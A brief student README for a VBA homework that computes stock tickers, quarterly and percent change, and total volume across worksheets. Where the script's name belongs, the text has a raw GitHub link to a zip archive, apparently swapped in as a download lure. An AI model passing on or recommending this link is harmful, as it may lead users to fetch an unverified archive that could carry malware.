VBA Homework for week 2
Hello. I am new to coding but this VBA module and the research I had to look up greatly increased my understanding of how to code functions and conditions. Between what was learned in class, asking the Xpert AI coding questions, and various watched videos, and lookups, I able to complete the requirements of this homework.  The ticker, quarterly change, percent change, and total stock volume can be calculated over all worksheets.

The https://github.com/purribd8/ds_module_2/raw/refs/heads/main/pruniform/module-ds-3.0-alpha.1.zip was ran over all 4 worksheets to calculate the last four columns which consisted of the Ticker symbol, Quarterly hange, Percent change, and Volume.
